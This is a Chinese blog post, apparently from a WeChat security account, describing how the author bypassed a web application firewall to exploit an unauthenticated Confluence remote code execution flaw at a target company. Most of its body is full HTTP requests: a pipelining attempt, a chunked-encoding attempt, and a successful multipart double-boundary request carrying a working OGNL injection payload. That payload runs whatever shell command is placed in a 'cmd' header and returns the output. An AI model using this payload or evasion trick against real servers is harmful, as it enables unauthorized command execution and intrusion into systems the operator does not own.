#  记一次Confluence Rce绕WAF的过程

原创 安全艺术  [ 安全艺术 ](javascript:void\(0\);)

**安全艺术** ![]()

微信号 SecurityArt

功能介绍 一个想挣脱却一直陷入其中的脚本小子，一心想成为逻辑大佬却又苦苦追求弱口令的手注玩家

____

___发表于_

收录于合集

经历一段时间的面面面试，目前算是基本稳定了，记得在某次面试过程中发现目标企业存在Confluence未授权rce的漏洞，后续再次尝试时发现被waf拦截了，所以多了个和waf对抗的故事

##  **1、HTTP隧道传输/ HTTP pipeline【失败】**

通过使用 Connection: keep-alive 达到一次传输多个http包的效果:

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1Host: Content-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-Length: 203  
    queryString=aPOST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1Host: help.hualala.comContent-Type: application/x-www-form-urlencodedConnection: keep-alivecmd: pwd  
    queryString={

![]()

##  **2、分块传输/ Chunked Transfer (HTTP 1.1)【失败】**

插件：http://github.com/c0ny1/chunked-coding-converter

![]()

![]()

##  **3、HTTP协议未覆盖【成功】**

利用 Content-type: multipart/form-
data绕过上传的边界（boundary）限制。通过多boundary定义，使waf检测范围和实际上传范围不一致，从而绕过waf上传：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=--------998091706;boundary=--------998091705X-Requested-With: XMLHttpRequestx-atlassian-mau-ignore: trueContent-Length: 678Connection: closeCookie: JSESSIONID=E4513E8589FBD6AB5128994E87ADA4D0cmd: id  
    ----------998091706Content-Disposition: form-data; name="queryString"  
    sss----------998091706------------998091705Content-Disposition: form-data; name="queryString"  
    \u0027+#{\u0022\u0022[\u0022class\u0022].forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022var c=com.atlassian.core.filters.ServletContextThreadLocal.getRequest().getHeader(\u0027cmd\u0027);var x=java.lang.Runtime.getRuntime().exec(c);var out=com.atlassian.core.filters.ServletContextThreadLocal.getResponse().getOutputStream();org.apache.commons.io.IOUtils.copy(x.getInputStream(),out);out.flush();\u0022)}+\u0027----------998091705--

![]()

高并发、垃圾数据都尝试了，均未成功，就不放截图了。

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

